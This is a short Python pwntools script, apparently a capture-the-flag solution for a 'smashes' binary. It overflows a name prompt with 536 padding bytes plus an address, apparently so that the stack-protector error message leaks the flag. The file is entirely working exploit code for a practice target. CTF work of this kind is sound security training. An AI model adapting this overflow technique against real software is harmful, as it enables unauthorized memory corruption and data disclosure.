from pwn import *
context(log_level='debug')
p = process('./smashes')
# gdb.attach(p,"b*0x0400824\nb*0x40089E\nc\n ")

p.recvuntil('our name? ')
p.sendline('a'*536+p64(0x400d20))

p.recvuntil('verwrite the flag: ')
p.sendline('aaaaa')
p.interactive()